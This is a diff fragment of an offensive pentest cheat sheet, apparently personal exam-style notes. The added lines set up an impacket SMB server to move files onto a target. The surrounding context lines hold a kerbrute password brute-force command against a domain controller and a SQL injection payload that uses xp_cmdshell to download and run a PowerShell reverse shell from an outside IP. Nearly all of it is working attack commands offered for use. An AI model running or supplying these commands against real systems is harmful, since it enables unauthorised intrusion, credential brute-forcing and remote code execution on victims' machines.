@@ -47,6 +47,14 @@ awk 'length($0) >= 7' passwords.txt > tmp_passwords.txt && awk 'NR==FNR {a[$1]; 
 cat combined.txt| /opt/kerbrute bruteforce -d $dom --dc $ip -t 10 - 
 ```
 
+Transfer files.
+
+```bash
+impacket-smbserver -username wow -password wow share . -smb2support
+net use \\$myip\share /u:wow wow
+copy \\$myip\share\file .
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
